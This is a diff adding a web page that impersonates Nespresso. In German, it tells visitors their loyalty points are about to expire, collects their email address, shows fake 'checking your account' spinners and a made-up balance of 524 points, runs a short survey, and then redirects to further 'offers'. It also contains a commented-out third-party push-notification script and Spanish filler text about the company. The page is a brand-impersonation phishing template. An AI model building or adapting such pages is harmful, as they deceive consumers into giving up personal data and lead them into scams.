@@ -1,0 +1,271 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nespresso Online</title>
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="./css/styles.css">
+    <script src="./js/modernizr.js"></script>
+    <script src="./js/jquery-3.3.1.min.js"></script>
+    <script src="./js/svg4everybody.min.js"></script>
+    <script src="./js/init.js"></script>
+    <script src="./js/script.js"></script>
+
+
+<!-- <script src="https://virtualpushplatform.com/ace-push.js"></script> -->
+<!-- <script> -->
+    <!-- initializeAcePush('6ec829a0-2d9d-4e84-8ae5-84dd942bbd6e'); -->
+<!-- </script> -->
+
+
+</head>
+
+<body class="loaded">
+    <div class="page">
+        <header>
+            <div class="header__logo">
+                <img src="./images/parcel.png" alt="logo">
+            </div>
+            <div class="header__menu">
+                <div id="header__menu-icon">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </div>
+            </div>
+        </header>
+
+        <div class="main-img">
+            <div class="main-img__content">
+            </div>
+        </div>
+
+        <!-- Screen 1 -->
+        <main class="main main--1">
+            <div class="card">
+                <h2 class="title">Konvertiere deine Treuepunkte, bevor sie ablaufen</h2>
+                <span class="badge" data-badge="!"><img src="images/photo.jpg" class="main_box" alt=""></span>
+                <p>
+                    Vom ersten Kauf bei Nespresso an profitieren Sie automatisch vom Treueprogramm, kostenlos. Dieses Programm ermöglicht es dem Kunden, Punkte basierend auf seiner Dauer der Mitgliedschaft und seiner Aktivität zu sammeln.
+</p>Zu jeder Zeit haben Sie die Möglichkeit, Ihre gesammelten Punkte in Geschenke umzuwandeln.
+                </p>
+
+                <hr>
+
+                <dl class="tracking-code">
+                    <dt>Bitte geben Sie Ihre E-Mail-Adresse ein:</dt>
+                    
+<input type="text" style=" width: 100%;padding: 12px 20px;margin: 8px 0;display: inline-block;border: 1px solid #ccc;border-radius: 4px;box-sizing: border-box;" name="Email" placeholder="Correo electrónico..">
+                </dl>
+            </div>
+
+            <button type="button" class="btn screen-trigger--1">MEIN KONTOSTAND ABFRAGEN</button>
+        </main>
+
+        <!-- Screen 2 -->
+        <main class="main main--2">
+            <div class="card">
+                <div class="spinner"></div>
+
+                <div role="img" class="main__icon icon icon-check"><i class="fa fa-check fa-4x"></i></div>
+
+                <ul class="loading-list">
+
+<li>Überprüfung Ihres Kontos...</li>
+<li>Abrufen Ihres Kontostands...</li>
+<li>Bearbeitung der Transaktion...</li>
+                </ul>
+            </div>
+        </main>
+
+        <!-- Screen 3 -->
+        <main class="main main--3">
+            <ol class="steps-wrap">
+                <li class="step step--current"></li>
+                <li class="step"></li>
+                <li class="step"></li>
+            </ol>
+            <div class="card">
+                <div class="product">
+                    <!-- <img src="" alt=""> -->
+                    <div class="product__content">
+                        <h3 class = "subtitle">Ihre Informationen: </h3>
+
+                        <dl class="product__info">
+                        <dt>Ihr Kontostand:</dt>
+                        <dd>524 Punkte</dd>
+                        </dl>
+                        <dl class="product__info">
+                        <dt>Bereit zur Umwandlung:</dt>
+                        <dd>524 Punkte</dd>
+                        </dl>
+                        <dl class="product__info">
+                        <dt>Ablaufdatum:</dt>
+                        <dd class="price">06/04/2025, 23:59</dd>
+                        </dl>
+                    </div>
+                </div>
+            </div>
+
+            <button type="button" class="btn screen-trigger--2">ICH KONVERTIERE MEINE PUNKTE</button>
+        </main>
+
+        <!-- Screen 4 -->
+        <main class="main main--4">
+            <ol class="steps-wrap">
+                <li class="step step--done"></li>
+                <li class="step step--current"></li>
+                <li class="step"></li>
+            </ol>
+
+            <div class="card">
+                <!-- <img src="" alt=""> -->
+
+                <form class="questions-wrap">
+                    <div class="question question--1">
+                        <h2 class = "subtitle">Sind Sie interessiert an:</h2>
+
+                        <div class="question__answers">
+                            <input type="radio" id="question01a" name="question01">
+                            <label for = "question01a">
+                                <span> Unsere Produkte </span>
+                            </label>
+
+                            <input type="radio" id="question01b" name="question01" disabled="">
+                            <label for = "question01b" data-error = "Es gibt derzeit keine Angebote">
+                                <span> Produkte unserer Partner </span>
+                            </label>
+                        </div>
+                    </div>
+
+                    <div class="question question--2">
+                        <h2 class = "subtitle"> Bist du interessiert an: </h2>
+
+                        <div class="question__answers">
+                            <input type="radio" id="question02a" name="question02">
+                            <label for = "question02a">
+                                <span> Professionelle Kaffeemaschinen </span>
+                            </label>
+
+                            <input type="radio" id="question02b" name="question02">
+                            <label for = "question02b">
+                                <span> Kapselkaffeemaschine </span>
+                            </label>
+                        </div>
+                    </div>
+
+                    <div class="question question--3">
+                        <h2 class = "subtitle"> Lieblings-Kaffeezubehör </h2>
+
+                        <div class="question__answers">
+                            <input type="radio" id="question03a" name="question03">
+                            <label for = "question03a">
+                                <span> Kaffeetassen </span>
+                            </label>
+
+                            <input type="radio" id="question03b" name="question03">
+                            <label for = "question03b">
+                                <span> Kekse und Schokolade </span>
+                            </label>
+                        </div>
+                    </div>
+                </form>
+            </div>
+        </main>
+
+        <!-- Screen 5 -->
+        <main class="main main--5">
+            <ol class="steps-wrap">
+                <li class="step step--done"></li>
+                <li class="step step--current"></li>
+                <li class="step"></li>
+            </ol>
+
+            <div class="card">
+                <div class="spinner"></div>
+
+                <div role="img" class="main__icon icon icon-check"><i class="fa fa-check fa-4x"></i></div>
+
+                <ul class="loading-list">
+
+<li>Wir speichern Ihre Präferenzen...</li>
+<li>Wir bestätigen Ihren Kontostand...</li>
+<li>Bestätigung der verfügbaren Angebote...</li>
+                </ul>
+            </div>
+        </main>
+
+        <!-- Screen 6 -->
+        <main class="main main--6">
+            <ol class="steps-wrap">
+                <li class="step step--done"></li>
+                <li class="step step--done"></li>
+                <li class="step step--current"></li>
+            </ol>
+            <div class="card">
+                <h2 class="title title - primary">Angebot, das zu Ihnen passt</h2>
+                <h3 class="subtitle" style="margin-bottom: 15px;"> Anzahl der gefundenen Angebote: 3<br>
+                    <span class="time-delivery">  </span>
+                </h3>
+                <p>
+                     <span class = "price"></span> 
+                </p>
+            </div>
+            <a class="btn btn_confirm" id="button1">Entdecke die Angebote</a>
+        </main>
+
+        <!-- <main class="main main--7" style="display:none;">
+            <ol class="steps-wrap">
+                <li class="step step--done"></li>
+                <li class="step step--done"></li>
+                <li class="step step--done"></li>
+            </ol>
+             <div class="card-form">
+                <h2 class = "title title - primary"> Fill in your details </h2>
+                <iframe id="form" src="" style="width:320px;height: 945px;" frameborder="0" scrolling="no"></iframe>
+            </div> 
+        </main> -->
+
+        <div class="foot">
+            <div class="footer__social">
+                <ul class="social__menu">
+                    <li><a class="facebook_link" ><i class="fa fa-facebook"></i></a></li>
+                    <li><a class="linkedin_link"><i class="fa fa-linkedin"></i></a></li>
+                    <li><a class="youtube_link"><i class="fa fa-youtube"></i></a></li>
+                </ul>
+            </div>
+            <div class="footer__contact">
+                <div class="footer__phone">
+                    <a><i class="fa fa-phone"></i></a>
+                </div>
+                <div class="footer__text">
+
+<h5>Sprechen Sie mit uns</h5>
+<p>Wir sind hier, um Ihnen zu helfen.</p>
+                </div>
+            </div>
+            <div id="foot-con" class="footer-con">
+                <div class="foot-con-inn">
+                    <br/><br/><br/><br/><br/><br/><br/><br/><br/>
+Nespresso es una empresa de Nestlé Nespresso SA, que forma parte del Grupo Nestlé y tiene su sede en Lausana, Suiza. Su modelo de negocio se basa en la venta de máquinas Nespresso y cápsulas individuales de aluminio que contienen café molido para producir el café a partir del contenido de la cápsula. Nespresso ofrece tanto un modelo doméstico como uno especializado para clientes especiales, como oficinas o hoteles. Actualmente, Nespresso está presente en 60 países y cuenta con alrededor de 12,000 empleados en todo el mundo.
+
+Las cápsulas de Nespresso están hechas de aluminio, con un pequeño film plastificado que limita el contacto entre el aluminio y el café. Están selladas herméticamente para evitar la pérdida de aromas del café, que se van perdiendo una vez molido con el contacto con el aire y la luz. Cada cápsula tiene distintas mezclas dependiendo del modelo. La base y los laterales de la cápsula están hechos de una cubierta de aluminio, mientras que la tapa tiene una fina hoja de aluminio. Cuando la cápsula se inserta en la máquina, la parte superior se perfora. Una vez activada, la cafetera calienta agua que se envía a la cápsula a una presión de 19 bares, y el café va a la taza. Las cápsulas son, por lo general, monodosis.
+
+Actualmente, la marca Nespresso ofrece dos tecnologías: la denominada "clásica", que se caracteriza por un sistema de extracción a base de presión, y otra línea llamada "Vertuo", que se caracteriza por una mayor variedad de porciones de café, así como un sistema de extracción patentado llamado Centrifusión.
+                    </p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+</body></html>
+
+<script>        
+    document.getElementById('button1').addEventListener("click",function(){
+        window.location.href="1/1.html";
+    },false);
+</script>
